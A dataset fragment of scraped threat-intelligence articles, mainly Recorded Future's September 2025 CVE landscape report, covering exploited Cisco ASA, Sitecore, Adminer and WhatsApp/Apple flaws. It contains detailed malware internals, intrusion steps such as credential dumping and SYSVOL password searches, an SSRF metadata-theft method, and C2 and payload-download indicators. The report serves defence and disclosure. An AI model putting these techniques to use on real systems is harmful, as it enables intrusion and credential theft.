6ba5d96e52734cbb9246bcc3decf127f780d48fa11587a1a44880c1f04404d23 (Bumblebee) DFIR Report: locker.exe de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d (Akira ransomware) Swisscom B2B CSIRT: win.exe 18b8e6762afd29a09becae283083c74a19fc09db1f2c3412c42f1b0178bc122a (Akira ransomware) #TB36726 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation KongTuke FileFix Leads to New Interlock RAT Variant Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 8
  },
  {
    "url": "https://www.recordedfuture.com/blog/september-2025-cve-landscape",
    "title": "September 2025 CVE Landscape",
    "content": "September 2025 CVE Landscape September 2025 CVE Landscape In September 2025, Recorded Future\u2019s Insikt Group\u00ae identified sixteen high-impact vulnerabilities that should be prioritized for remediation. This represents a decrease from the eighteen identified in August, with the number of Very Critical vulnerabilities also decreasing (11) month over month. These vulnerabilities have affected the following vendors: Sudo, Libraesva, Fortra, Cisco, Adminer, Google, Dassault Syst\u00e8mes, Linux, Android, Sitecore, TP-Link, and Meta Platforms. September was dominated by flaws in Cisco and TP-Link, which together represented six of the sixteen vulnerabilities. Cisco\u2019s IOS, IOS XE, and Secure Firewall products were affected by flaws, including stack-based and classic buffer overflows (CWE-121, CWE-120) and missing authorization (CWE-862). TP-Link devices also featured prominently, with authentication bypass, OS command injection, and missing authentication vulnerabilities across several router models. In September, Recorded Future\u2019s Insikt Group\u00ae created six Nuclei templates, including those for the Sitecore (CVE-2025-53690) and Adminer (CVE-2021-21311) vulnerabilities featured in this report. Additionally, Insikt Group identified public proof-of-concept (PoC) exploits for six of the sixteen vulnerabilities. Recorded Future\u2019s Insikt Group\u2019s\u00ae CVE Findings from September 2025: CWE-502 (Deserialization of Untrusted Data) was the most commonly observed weakness, followed by command injection issues (CWE-77 and CWE-78) and various authorization and authentication flaws (CWE-862, CWE-863, CWE-290, and CWE-306). Two of the sixteen vulnerabilities were associated with malware campaigns: threat actors exploited CVE-2025-20333 and CVE-2025-20362 in legacy Cisco ASA devices to deploy the multi-stage bootkit RayInitiator and the modular shellcode LINE VIPER; and exploited CVE-2025-53690 (Sitecore) to deliver WEEPSTEEL, EARTHWORM, and SharpHound. Seven of the sixteen vulnerabilities (CVE-2025-59689, CVE-2025-10035, CVE-2025-20352, CVE-2025-20333, CVE-2025-5086, CVE-2025-53690, and CVE-2025-9377) allowed attackers to execute arbitrary code (RCE) or inject commands. These seven vulnerabilities affected Libraesva, Fortra, Cisco, Dassault Syst\u00e8mes, Sitecore, and TP-Link products. Exploitation and Detection Highlights This section analyzes the highest-impact, actively exploited vulnerabilities this month, each with a Very Critical or Critical Recorded Future Risk Score. Where applicable, it also highlights the availability of Nuclei templates created by Insikt Group, which can be accessed by Recorded Future customers. This section focuses on vulnerabilities with available PoCs or technical analyses. It does not highlight vulnerabilities whose public information is limited to a description of the CVE. Threat Actors Exploit Cisco ASA Vulnerabilities (CVE-2025-20333 and CVE-2025-20362) to Deploy RayInitiator and LINE VIPER On September 25, 2025, the UK National Cyber Security Centre (NCSC), in collaboration with the US Cybersecurity and Infrastructure Security Agency (CISA) and Cisco, published a technical analysis detailing a persistent malware campaign that exploits vulnerabilities (CVE-2025-20333 and CVE-2025-20362) in legacy Cisco Adaptive Security Appliance (ASA) 5500-X series devices, affecting firmware versions 9.12(4)67 and 9.14(4)24 without secure boot and with virtual private network (VPN) web services enabled, to deploy a multi-stage bootkit called RayInitiator and a modular shellcode called LINE VIPER. CVE-2025-20333 is a buffer overflow vulnerability resulting from improper validation of user-supplied input in HTTP(S) requests to Cisco web services. A remote, authenticated attacker with valid VPN credentials can achieve remote code execution (RCE). CVE-2025-20362 is a missing authorization vulnerability resulting from improper validation of user-supplied input in HTTP(S) requests in the VPN web server of Cisco Secure Firewall ASA and FTD. Successfully exploiting the vulnerability could allow remote, unauthenticated attackers to access a restricted URL by sending crafted HTTP requests. According to Cisco, when chained, CVE-2025-20333 and CVE-2025-20362 enable an unauthenticated, remote threat actor to gain complete control over vulnerable VPN and WebVPN services on affected ASA devices. On September 25, 2025, Cisco released patches to fix CVE-2025-20333 and CVE-2025-20362. On the same day, CISA added CVE-2025-20333 and CVE-2025-20362 to its Known Exploited Vulnerabilities (KEV) catalog. Figure 1: Vulnerability Intelligence Card\u00ae for CVE-2025-20333 in Recorded Future (Source: Recorded Future) Based on NCSC and Cisco, after gaining RCE, threat actors patch a compromised Cisco ASA\u2019s GNU Grand Unified Bootloader (GRUB) to invoke RayInitiator Stage 1 early in boot by hooking the firmware and kernel load path at the console string Booting\u2026/Booting the kernel . In some non\u2011Secure\u2011Boot ASA 5500\u2011X models, threat actors modify the Read-Only Memory Monitor (ROMMON) to retain persistence across reboots and upgrades. RayInitiator Stage 1 performs the following actions on a victim\u2019s device: Scans the hard-coded firmware memory region 0x400000\u20130x600000 for the console boot string Subtracts 0x10000 from the found string address and searches that area for a specific assembly pattern to locate the kernel\u2011load routine Verifies the match by comparing the assembly pattern\u2019s address operand ( [addr] ) with the boot string location to ensure it has the correct patch target Saves the original bytes of the legitimate code for later use Patches the kernel\u2011load routine to transfer control to Stage 2 Restores and re\u2011executes the original bytes to ensure the device outputs the expected boot message For Stage 2, RayInitiator performs the following actions on a victim\u2019s device: Searches the previous stack frame for candidate Kernel Address Space Layout Randomization (KASLR) base values Checks each candidate's base address for 0x10000 alignment and filters out unaligned addresses Adds fixed offset 0x600490 to aligned candidates and checks whether that address points to the kernel substring nmi_max_ to confirm the correct KASLR base Saves the verified KASLR base and adjusts subsequent kernel addresses and offsets using that base Copies Stage 3 into KASLR base at offset 0x300 (a large no-operation [NOP]\u2011filled code cave) Locates the sched_getparam system call (syscall) table entry at a fixed offset, saves the original pointer, and overwrites the entry to point to the Stage 3 kernel copy Manipulates the stack and return addresses to ensure that when lina calls sched_getparam during load, execution transfers into the Stage 3 install phase; lina is a Cisco ASA user\u2011space binary that implements the device\u2019s core functionality and handles services such as WebVPN Restores the original sched_getparam pointer from the Stage 3 install phase to ensure normal sched_getparam behavior resumes after install runs For Stage 3, RayInitiator performs the following actions on a victim\u2019s device: Searches lina\u2019s memory to locate the WebVPN XML element parsing table and the \u201cform\u201d element entry Overwrites the form element handler to point at the sched_getparam hook, causing processing of a form element to invoke Stage 3\u2019s deploy phase Parses the first form element of an incoming WebVPN request to verify a hard\u2011coded victim ASCII group token as the first identifier Scans XML elements for the second victim identifier (an eight\u2011byte hex token) immediately followed by the LINE VIPER shellcode stub Copies the LINE VIPER shellcode stub into the lina data area and marks that page executable via a direct mprotect system call Overwrites the form handler to point to the executable shellcode stub, causing the next processed form element to trigger shellcode execution Deletes the initial shellcode stub and adjusts handlers as required to allow LINE VIPER to stage itself and hook into VPN client authentication processing for persistent tasking Following RayInitiator Stage 3, LINE VIPER performs the following actions on a victim\u2019s device: Executes an in\u2011memory stub and XOR\u2011deobfuscates staged code using a 32\u2011byte victim key from a WebVPN xml element Deletes the transient stub and RayInitiator install artifacts, copies staged sections into a lina code cave and the .data region, and hooks lina to intercept VPN client authentication requests Verifies victim-specific tokens embedded in XML attributes before running payloads, enforcing execution on intended targets Performs an RSA-based key exchange to derive per-victim key material, stores random key sets, and returns RSA-encrypted key material in an XML message for the threat actors to use Accepts AES-CBC-256 encrypted tasking over HTTPS WebVPN using the derived keys and returns AES-encrypted responses inside XML message elements Supports an Internet Control Message Protocol (ICMP) tasking method tunneled over the VPN for requests and sends exfiltration via raw transmission control protocol (TCP) from the ASA WAN interface to threat actor VPN IP addresses on high ephemeral ports Executes modular payloads to run command-line interface (CLI) commands, perform hidden packet captures (RADIUS, LDAP, TACACS), bypass Authentication, Authorization, and Accounting (AAA) for threat actor devices using a device\u2011ID table, harvest user CLI commands, and schedule delayed reboots Hides activity by suppressing specific syslog entries, temporarily changing memory permissions to avoid artifacts, altering core\u2011dump handling to force reboots, and returning legitimate hashes to conceal tampering Exfiltrates collected data either inside encrypted WebVPN XML responses or via the ICMP to raw-TCP channel using a lina proxy process that constructs TCP connections and streams data to threat actors\u2019 addresses NCSC identifies RayInitiator and LINE VIPER as an evolution of LINE DANCER and LINE RUNNER from the April 2024 ArcaneDoor campaign due to their shared use of victim-specific tokens, targeting of legacy Cisco ASA devices, abuse of WebVPN authentication traffic for shellcode delivery, and modular shellcode architecture. Cisco and CISA provided the following mitigations and remediation to counter persistent exploitation of CVE-2025-20333 and CVE-2025-20362 and the infection of RayInitiator and LINE VIPER malware: Apply Cisco security updates released for CVE-2025-20333 and CVE-2025-20362 Disconnect unsupported ASA devices reaching end-of-support Collect and submit core dumps from all public-facing ASA devices to CISA Verify ROMMON integrity on ASA 5500-X without Secure Boot and rebuild or reset compromised devices following Cisco eviction guidance Restrict VPN and WebVPN management interfaces and monitor for indicators of compromise (IoCs), including abnormal XML tokens, suppressed logs, and unusual outbound traffic Additionally, Cisco released a fix for CVE-2025-20363, a related heap-based buffer overflow vulnerability that could allow remote, unauthenticated attackers to execute arbitrary code (RCE) as root. At the time of writing, there is no evidence of in-the-wild exploitation of CVE-2025-20363. Insikt-Validated TTP: Using Nuclei to Detect CVE-2025-53690, an Actively Exploited Deserialization of Untrusted Data Vulnerability in Sitecore On September 3, 2025, cybersecurity firm Mandiant published an analysis of an active exploitation of a ViewState deserialization vulnerability, tracked as CVE-2025-53690, in Sitecore deployments. CVE-2025-53690 is a deserialization of untrusted data vulnerability affecting Sitecore Experience Manager (XM), Experience Platform (XP), and Experience Commerce (XC). In this incident, the affected deployments had retained a sample machine key that had been exposed in Sitecore deployment guides (from 2017 and earlier). The threat actors leveraged this exposed machine key to execute arbitrary code (RCE). They achieved initial access by targeting /sitecore/blocked.aspx , a legitimately reachable page that accepts ViewState. POST requests to this endpoint coincided with ASP.NET Application log Event ID 1316 ( ViewState verification failed ), consistent with signed/encrypted ViewState being forged via the exposed machine key. A decrypted payload contained an embedded .NET assembly named Information.dll (tracked as WEEPSTEEL), which enumerates host, disk, network adapter, and process information and returns results disguised as a benign __VIEWSTATE value. Following code execution with NETWORK SERVICE privileges (equivalent to the IIS process w3wp.exe ), the threat actors archived the Sitecore Content Delivery web root ( \\inetpub\\sitecore\\SitecoreCD\\Website ) to collect sensitive configuration files (for example, web.config ), then staged tooling under public user directories (for example, C:\\Users\\Public\\Music ). The threat actors deployed EARTHWORM to establish reverse SOCKS tunnels to command-and-control (C2) servers at 130[.]33[.]156[.]194[:]443 and 103[.]235[.]46[.]102[:]80 ; installed DWAgent as a SYSTEM service for persistent remote access and Active Directory (AD) reconnaissance; executed SharpHound (saved as sh.exe ) to map Active Directory; and used GoToken.exe , which Mandiant links with a public token-stealing tool GoTokenTheft. Additionally, a launcher script ( 1.vbs ) was used to start EARTHWORM, and 7za.exe (a command-line executable for the 7-Zip file archiver) was employed to archive collection output for exfiltration. For privilege escalation and credential access, the threat actors created local administrator accounts ( asp$ and sawadmin ), dumped SAM and SYSTEM registry hives, attempted token theft, and disabled password expiration on targeted administrator accounts. asp$ was created by executing helper.exe wrapping net user/net localgroup commands; sawadmin was created during a DWAgent session. Lateral movement relied heavily on remote desktop protocol (RDP) pivoting through the EARTHWORM tunnel, with additional AD discovery (for example, nltest /DCLIST and findstr searches for cpassword in SYSVOL ). During one RDP session under asp$ , the threat actors downloaded dwagent.exe and main.exe into C:\\Users\\asp$\\Downloads . After establishing access to the compromised admin accounts, the previously created local accounts were removed. Recorded Future\u2019s Insikt Group\u00ae created a Nuclei template, which is available to Recorded Future customers, to detect CVE-2025-53690. The template sends a GET request to the /sitecore/shell/sitecore.version.xml endpoint, verifies that the HTTP status code is 200, and checks whether the response body contains <major> and <minor> tags indicating a major version of 0-8 or exactly 9.0 (major 9 with minor 0). If confirmed, it extracts the Sitecore major and minor numbers from the XML body using regex and formats them into a normalized string ( Sitecore Version: X.Y ). If the XML is unavailable, the template performs a fallback GET request to /sitecore/login , verifies that the status code is 200, and checks for the login banner text matching Sitecore.NET x.y for versions 0-8.x or 9.0. This template fingerprints two Sitecore endpoints and flags instances reporting versions before or equal to 8.x, or exactly 9.0, ranges historically associated with deployment guides that included a sample ASP.NET <machineKey> . It does not verify whether a static or compromised <machineKey> is present, nor whether a ViewState endpoint is reachable. Exploitability for CVE-2025-53690 depends on the use (or compromise) of a static machine key, not the version alone. This template performs non-invasive fingerprinting by issuing two GET requests to the Sitecore version and login endpoints and evaluating their response. It verifies the presence of identified keywords in the body, confirms 200 status codes, and extracts version strings using regex. No payloads are sent, no authentication is attempted, and no system state is modified (no file writes, configuration changes, or persistence). Expected observables are limited to a routine HTTP GET request recorded in access logs. This Nuclei template is intended for use in authorized environments only. Sitecore recommends customers who deployed XM, XP, or XC with the sample ASP.NET machine key from legacy guidance (XP 9.0 or earlier and Active Directory 1.4 or earlier) to immediately: Examine their environments for suspicious or anomalous activity Rotate the machine keys defined in web.config Ensure any <machineKey> elements in web.config are encrypted Restrict web.config access to application administrators only Adopt timely, recurring rotation of static machine keys For configurations that require static machine keys, Sitecore recommends that customers follow its machine-key rotation procedure as a best practice and to rotate keys if compromise is suspected. Additionally, Mandiant also recommends hardening ASP.NET itself by enabling ViewState Message Authentication Code (MAC), moving to automatic per-app machine-key rotation, and encrypting other plaintext secrets in web.config beyond the <machineKey> element. Additionally, Mandiant provided the following indicators of compromise (IoCs): asp$ (created account) Sawadmin (created account) H496883 (workstation from the RDP connection) 1.vbs (EARTHWORM loader) SHA-256: a566cceaf9a66332470a978a234a8a8e2bbdd4d6aa43c2c75c25a80b3b744307 (WEEPSTEEL; Information.dll ) SHA-256: b3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b (EARTHWORM; lfe.ico , ufp.exe , and ufp.ico ) SHA-256: 61f897ed69646e0509f6802fb2d7c5e88c3e3b93c4ca86942e24d203aa878863 (SharpHound) SHA-256: 223b873c50380fe9a39f1a22b6abf8d46db506e1c08d08312902f6f3cd1f7ac3 (executable for 7-Zip archiver) MD5: f410d88429b93786b224e489c960bf5c ( Helper.ico and helper.exe ) MD5: be7e2c6a9a4654b51a16f8b10a2be175 ( main.exe file downloaded from hxxp://130[.]33[.]156[.]194/main.exe ) MD5: 62483e732553c8ba051b792949f3c6d0 ( GoToken.exe ) 130[.]33[.]156[.]194[:]443 (C2 server 130[.]33[.]156[.]194[:]8080 (unspecified, likely C2 server) 103[.]235[.]46[.]102[:]80 (C2 server) At the time of writing, there were 330 exposed Sitecore instances on Shodan, most of which were geolocated in the United States (US), followed by Australia, the United Arab Emirates (UAE), South Africa, and the United Kingdom (UK). However, not all of these are necessarily vulnerable, since Shodan does not reveal the specific version strings that can be extracted through targeted requests. Figure 2: Vulnerability Intelligence Card\u00ae for CVE-2025-53690 in Recorded Future (Source: Recorded Future) Insikt-Validated TTP: Using Nuclei to Detect CVE-2021-21311, an Actively Exploited Server-Side Request Forgery Vulnerability in Adminer On September 29, 2025, the US Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2021-21311 to its Known Exploited Vulnerabilities (KEV) catalog. CVE-2021-21311 is a high-severity server-side request forgery (SSRF) vulnerability in Adminer versions 4.0.0 through 4.7.8, affecting users of Adminer bundling all drivers (for example, adminer.php ). Users should therefore upgrade to version 4.7.9. Adminer is an open-source database management tool that natively supports Structured Query Language (SQL) database systems (for example, MySQL, PostgreSQL, SQLite, MS SQL, MariaDB, and Oracle) and can be extended via plugins to support systems like Elasticsearch and MongoDB. CVE-2021-21311 enables SSRF via Adminer\u2019s HTTP-based drivers, allowing a remote unauthenticated attacker to coerce the application into issuing arbitrary HTTP GET requests to internal endpoints and echoing the response body in the user interface. Security researchers demonstrated a proof-of-concept that starts a simple Python HTTP server that replies with a 301 redirect to an AWS Instance Metadata Service (IMDS) endpoint; when Adminer \u201clogs in\u201d to the attacker-controlled server using the Elasticsearch module, it follows the redirect and prints the IMDS response, confirming access to metadata and enabling retrieval of sensitive information such as AWS access keys. Successfully exploiting the vulnerability can therefore expose sensitive information, enable access to internal resources, and in environments where internal HTTP services are reachable (for example, Elasticsearch/ClickHouse application programming interfaces [APIs]), permit data modification or unauthorized administrative actions. An attacker can also automate SSRF to probe and enumerate internal services; in cloud deployments, any exfiltrated credentials inherit the permissions of the instance profile, enabling lateral movement or escalation consistent with that role. Recorded Future\u2019s Insikt Group\u00ae created a Nuclei template, which is available to Recorded Future customers, to detect CVE-2021-21311. The template sends a POST request to common Adminer paths (for example, /adminer.php and /index.php ), setting auth[driver]=elastic and auth[server]=example.com with placeholder credentials (username and database default to test ). This prompts vulnerable builds to attempt an outbound fetch and surface an error page. A target is flagged when the HTTP status is 200, 400, or 403 and the response body contains a 400 - Bad Request title (raw or HTML-escaped), indicating Adminer displayed a 400 error page during the external fetch attempt. On patched Adminer versions (4.7.9 and later), non-200 response bodies are not printed (see commit ccd2374 ). This template performs a non-intrusive SSRF check against Adminer by sending a crafted POST request to a small set of common Adminer paths. No authentication is attempted, no database content is modified, and no system state is altered (for example, no file writes, configuration changes, or persistence). Expected observables are limited to a small number of HTTP POST requests recorded in access logs and an HTML response containing a 400 - Bad Request title (consistent with the external fetch attempt outlined above). An outbound HTTP request from the target toward example.com may also be visible in egress logs. This Nuclei template is intended for use in authorized environments only. At the time of writing, there were 9,651 exposed Adminer instances on Shodan , most of which are geolocated in Germany, the US, Russia, France, and Singapore. However, not all of these are necessarily vulnerable, as their specific versions are unknown. Attack Chain Scenario for WhatsApp Zero-Click (CVE-2025-55177) and Apple OOB Write (CVE-2025-43300) Vulnerabilities Published On August 30, 2025, security researcher Vaibhav Kanada published a technical blog detailing an attack chain scenario for CVE-2025-55177 and CVE-2025-43300. CVE-2025-55177 is a zero-click authorization bypass vulnerability in WhatsApp\u2019s linked-device synchronization feature, affecting WhatsApp for iOS versions before 2.25.21.73, WhatsApp Business for iOS versions prior to 2.25.21.78, and WhatsApp for Mac versions prior to 2.25.21.78. CVE-2025-43300 is an out\u2011of\u2011bounds (OOB) write vulnerability in Apple\u2019s ImageIO framework, affecting iOS, iPadOS, and macOS versions before iOS 18.6.2, iPadOS 18.6.2, and macOS Sequoia 15.6.1. CVE-2025-55177 allows threat actors to deliver crafted synchronization messages containing malicious URLs, forcing vulnerable devices to download and process untrusted online content. When combined with CVE-2025-43300, threat actors can escalate privileges and compromise targeted iOS, iPadOS, and macOS systems. On August 20, 2025, WhatsApp released client updates to fix CVE-2025-55177, and Apple released iOS 18.6.2, iPadOS 18.6.2, and macOS Sequoia 15.6.1 to patch CVE-2025-43300. Additionally, WhatsApp stated that CVE-2025-55177 and CVE-2025-43300 may have been exploited in the wild against targeted users before the release of the patches. On August 20, 2025, CISA added CVE-2025-43300 to its KEV catalog, and added CVE-2025-55177 on September 2, 2025. CVE-2025-55177 stems from the incomplete authorization in WhatsApp\u2019s linked-device synchronization feature. This feature authenticates and synchronizes messages and activity between a user\u2019s primary device and linked companion devices, ensuring that devices paired by the user can securely exchange and process synchronization messages. However, WhatsApp fails to enforce proper authorization checks, which allows unauthorized devices to send crafted synchronization messages that force the victim\u2019s client to process malicious remote content. CVE-2025-43300 stems from insufficient bounds checking in Apple\u2019s ImageIO framework. This framework parses and renders common image formats, such as JPEG and TIFF, to display media across iOS, iPadOS, and macOS. However, ImageIO fails to properly validate image metadata structures, which allows crafted files to trigger OOB writes that corrupt memory and enable threat actors to execute arbitrary code with elevated privileges. Kanada provided the following attack chain scenario for the exploitation of CVE-2025-55177 and CVE-2025-43300: The threat actor exploits CVE-2025-55177 by sending a malicious synchronization message with a crafted URL to the target\u2019s linked device. The victim\u2019s WhatsApp client processes the remote content without proper authorization and executes malicious payloads hosted on threat actor-controlled infrastructure. If the payload contains a malicious image exploiting CVE-2025-43300, it runs with escalated privileges and bypasses Apple\u2019s security mechanisms. The threat actor installs persistent malware, exfiltrates data, or further compromises the device with escalated privileges. This attack chain scenario demonstrates a critical exploitation path combining application-level authorization bypass with kernel-level privilege escalation. Figure 3: Vulnerability Intelligence Card\u00ae for CVE-2025-43300 in Recorded Future (Source: Recorded Future) Prominent Vulnerability Disclosures from September 2025 Recorded Future Risk Scores range from \u201cNone\u201d (0) to \u201cVery Critical\u201d (90-99) and can change with new analytics and sources. Insikt Group identified 1,096 vulnerabilities disclosed in September with Risk Scores of 65 or above (High to Very Critical). The table below lists the sixteen vulnerabilities that were actively exploited in September based on Recorded Future\u00ae data. The table below also provides examples of public PoCs identified by Insikt Group. These PoCs were not tested for accuracy or efficacy. Vulnerability management teams should exercise caution and verify the validity of PoCs before testing. # Vulnerability Risk Score Affected Vendor/Product Vulnerability Type/Component Public PoC 1 CVE-2025-32463 99 Sudo CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) Yes 2 CVE-2025-59689 99 Libraesva Email Security Gateway CWE-77 (Command Injection) No 3 CVE-2025-10035 99 Fortra GoAnywhere MFT CWE-502 (Deserialization of Untrusted Data); CWE-77 (Command Injection) Yes 4 CVE-2025-20352 99 Cisco IOS and IOS XE CWE-121 (Stack-Based Buffer Overflow) Yes 5 CVE-2021-21311 99 Adminer CWE-918 (Server-Side Request Forgery) Yes 6 CVE-2025-20362 99 Cisco Secure Firewall Adaptive Security Appliance and Secure Firewall Threat Defense CWE-862 (Missing Authorization) No 7 CVE-2025-20333 99 Cisco Secure Firewall Adaptive Security Appliance and Secure Firewall Threat Defense CWE-120 (Classic Buffer Overflow) No 8 CVE-2025-10585 99 Google Chromium V8 CWE-843 (Type Confusion) No 9 CVE-2025-5086 99 Dassault Syst\u00e8mes DELMIA Apriso CWE-502 (Deserialization of Untrusted Data) Yes 10 CVE-2025-38352 89 Linux Kernel CWE-367 (Time-of-Check Time-of-Use Race Condition) No 11 CVE-2025-48543 99 Android Runtime CWE-416 (Use-After-Free) Yes 12 CVE-2025-53690 99 Sitecore Experience Manager (XM), Experience Platform (XP), and Experience Commerce (XC) CWE-502 (Deserialization of Untrusted Data) No 13 CVE-2023-50224 89 TP-Link TL-WR841N CWE-290 (Authentication Bypass by Spoofing) No 14 CVE-2025-9377 89 TP-Link Multiple Routers CWE-78 (OS Command Injection) No 15 CVE-2020-24363 89 TP-Link TL-WA855RE CWE-306 (Missing Authentication for Critical Function) No 16 CVE-2025-55177 89 Meta Platforms WhatsApp CWE-863 (Incorrect Authorization) No Table 1: List of vulnerabilities that were actively exploited in September based on Recorded Future data. How Recorded Future reduces risk from CVEs Timely and relevant information on vulnerabilities in your environment and that of your vendors and suppliers is critical for reducing risk. Find out how Recorded Future can support your team by increasing visibility, improving efficiency, and enabling confident decisions. Vulnerability Intelligence \u2013 Prioritize vulnerabilities based on the likelihood of exploitation \u2013 not just the severity. Easily understand the risk of exploitation alongside severity, and real-time contextualized intelligence to help you quickly make confident decisions, patch what matters, and prevent attacks. Attack Surface Intelligence \u2013 Identify internet-facing assets vulnerable to a specific CVE. Attack Surface Intelligence provides an outside-in view of your organization to help you actively discover, prioritize, and respond to unknown, vulnerable, or misconfigured assets. Figure 4: Signature for CVE-2025-53690 in Recorded Future Attack Surface Intelligence \u00ae (Source: Recorded Future) Third-Party Intelligence \u2013 Gain an external view of the security posture of your vendors and partners. Eliminate time-consuming research and vendor communication cycles with the ability to promptly assess vulnerabilities in their internet-facing systems. Insikt Group \u2013 Receive access to exclusive reports on new vulnerabilities and trends from Recorded Future\u2019s team of experts, the Insikt Group. Download Nuclei templates created by Insikt Group for select CVEs to test potentially vulnerable instances. Recorded Future Professional Services \u2013 Work with our Professional Services team on a Vulnerability Analysis Engagement. Designed to equip your team with advanced strategies for identifying, prioritizing, and mitigating threats effectively, this program delves into technologies and operations essential for a successful vulnerability management program. (Learn more about how our Professional Services team can help your elevate your team by watching our recent Vulnerability Prioritization Workshop ) About Insikt Group\u00ae: Recorded Future\u2019s Insikt Group, the company\u2019s threat research division, comprises analysts and security researchers with deep government, law enforcement, military, and intelligence agency experience. Their mission is to produce intelligence that reduces risk for customers, enables tangible outcomes, and prevents business disruption.",
    "filtered_content": "September 2025 CVE Landscape September 2025 CVE Landscape In September 2025, Recorded Future\u2019s Insikt Group\u00ae identified sixteen high-impact vulnerabilities that should be prioritized for remediation. This represents a decrease from the eighteen identified in August, with the number of Very Critical vulnerabilities also decreasing (11) month over month. These vulnerabilities have affected the following vendors: Sudo, Libraesva, Fortra, Cisco, Adminer, Google, Dassault Syst\u00e8mes, Linux, Android, Sitecore, TP-Link, and Meta Platforms. September was dominated by flaws in Cisco and TP-Link, which together represented six of the sixteen vulnerabilities. Cisco\u2019s IOS, IOS XE, and Secure Firewall products were affected by flaws, including stack-based and classic buffer overflows (CWE-121, CWE-120) and missing authorization (CWE-862). TP-Link devices also featured prominently, with authentication bypass, OS command injection, and missing authentication vulnerabilities across several router models. In September, Recorded Future\u2019s Insikt Group\u00ae created six Nuclei templates, including those for the Sitecore (CVE-2025-53690) and Adminer (CVE-2021-21311) vulnerabilities featured in this report. Additionally, Insikt Group identified public proof-of-concept (PoC) exploits for six of the sixteen vulnerabilities. Recorded Future\u2019s Insikt Group\u2019s\u00ae CVE Findings from September 2025: CWE-502 (Deserialization of Untrusted Data) was the most commonly observed weakness, followed by command injection issues (CWE-77 and CWE-78) and various authorization and authentication flaws (CWE-862, CWE-863, CWE-290, and CWE-306). Two of the sixteen vulnerabilities were associated with malware campaigns: threat actors exploited CVE-2025-20333 and CVE-2025-20362 in legacy Cisco ASA devices to deploy the multi-stage bootkit RayInitiator and the modular shellcode LINE VIPER; and exploited CVE-2025-53690 (Sitecore) to deliver WEEPSTEEL, EARTHWORM, and SharpHound. Seven of the sixteen vulnerabilities (CVE-2025-59689, CVE-2025-10035, CVE-2025-20352, CVE-2025-20333, CVE-2025-5086, CVE-2025-53690, and CVE-2025-9377) allowed attackers to execute arbitrary code (RCE) or inject commands. These seven vulnerabilities affected Libraesva, Fortra, Cisco, Dassault Syst\u00e8mes, Sitecore, and TP-Link products. Exploitation and Detection Highlights This section analyzes the highest-impact, actively exploited vulnerabilities this month, each with a Very Critical or Critical Recorded Future Risk Score. Where applicable, it also highlights the availability of Nuclei templates created by Insikt Group, which can be accessed by Recorded Future customers. This section focuses on vulnerabilities with available PoCs or technical analyses. It does not highlight vulnerabilities whose public information is limited to a description of the CVE. Threat Actors Exploit Cisco ASA Vulnerabilities (CVE-2025-20333 and CVE-2025-20362) to Deploy RayInitiator and LINE VIPER On September 25, 2025, the UK National Cyber Security Centre (NCSC), in collaboration with the US Cybersecurity and Infrastructure Security Agency (CISA) and Cisco, published a technical analysis detailing a persistent malware campaign that exploits vulnerabilities (CVE-2025-20333 and CVE-2025-20362) in legacy Cisco Adaptive Security Appliance (ASA) 5500-X series devices, affecting firmware versions 9.12(4)67 and 9.14(4)24 without secure boot and with virtual private network (VPN) web services enabled, to deploy a multi-stage bootkit called RayInitiator and a modular shellcode called LINE VIPER. CVE-2025-20333 is a buffer overflow vulnerability resulting from improper validation of user-supplied input in HTTP(S) requests to Cisco web services. A remote, authenticated attacker with valid VPN credentials can achieve remote code execution (RCE). CVE-2025-20362 is a missing authorization vulnerability resulting from improper validation of user-supplied input in HTTP(S) requests in the VPN web server of Cisco Secure Firewall ASA and FTD. Successfully exploiting the vulnerability could allow remote, unauthenticated attackers to access a restricted URL by sending crafted HTTP requests. According to Cisco, when chained, CVE-2025-20333 and CVE-2025-20362 enable an unauthenticated, remote threat actor to gain complete control over vulnerable VPN and WebVPN services on affected ASA devices. On September 25, 2025, Cisco released patches to fix CVE-2025-20333 and CVE-2025-20362. On the same day, CISA added CVE-2025-20333 and CVE-2025-20362 to its Known Exploited Vulnerabilities (KEV) catalog. Figure 1: Vulnerability Intelligence Card\u00ae for CVE-2025-20333 in Recorded Future (Source: Recorded Future) Based on NCSC and Cisco, after gaining RCE, threat actors patch a compromised Cisco ASA\u2019s GNU Grand Unified Bootloader (GRUB) to invoke RayInitiator Stage 1 early in boot by hooking the firmware and kernel load path at the console string Booting\u2026/Booting the kernel . In some non\u2011Secure\u2011Boot ASA 5500\u2011X models, threat actors modify the Read-Only Memory Monitor (ROMMON) to retain persistence across reboots and upgrades. RayInitiator Stage 1 performs the following actions on a victim\u2019s device: Scans the hard-coded firmware memory region 0x400000\u20130x600000 for the console boot string Subtracts 0x10000 from the found string address and searches that area for a specific assembly pattern to locate the kernel\u2011load routine Verifies the match by comparing the assembly pattern\u2019s address operand ( [addr] ) with the boot string location to ensure it has the correct patch target Saves the original bytes of the legitimate code for later use Patches the kernel\u2011load routine to transfer control to Stage 2 Restores and re\u2011executes the original bytes to ensure the device outputs the expected boot message For Stage 2, RayInitiator performs the following actions on a victim\u2019s device: Searches the previous stack frame for candidate Kernel Address Space Layout Randomization (KASLR) base values Checks each candidate's base address for 0x10000 alignment and filters out unaligned addresses Adds fixed offset 0x600490 to aligned candidates and checks whether that address points to the kernel substring nmi_max_ to confirm the correct KASLR base Saves the verified KASLR base and adjusts subsequent kernel addresses and offsets using that base Copies Stage 3 into KASLR base at offset 0x300 (a large no-operation [NOP]\u2011filled code cave) Locates the sched_getparam system call (syscall) table entry at a fixed offset, saves the original pointer, and overwrites the entry to point to the Stage 3 kernel copy Manipulates the stack and return addresses to ensure that when lina calls sched_getparam during load, execution transfers into the Stage 3 install phase; lina is a Cisco ASA user\u2011space binary that implements the device\u2019s core functionality and handles services such as WebVPN Restores the original sched_getparam pointer from the Stage 3 install phase to ensure normal sched_getparam behavior resumes after install runs For Stage 3, RayInitiator performs the following actions on a victim\u2019s device: Searches lina\u2019s 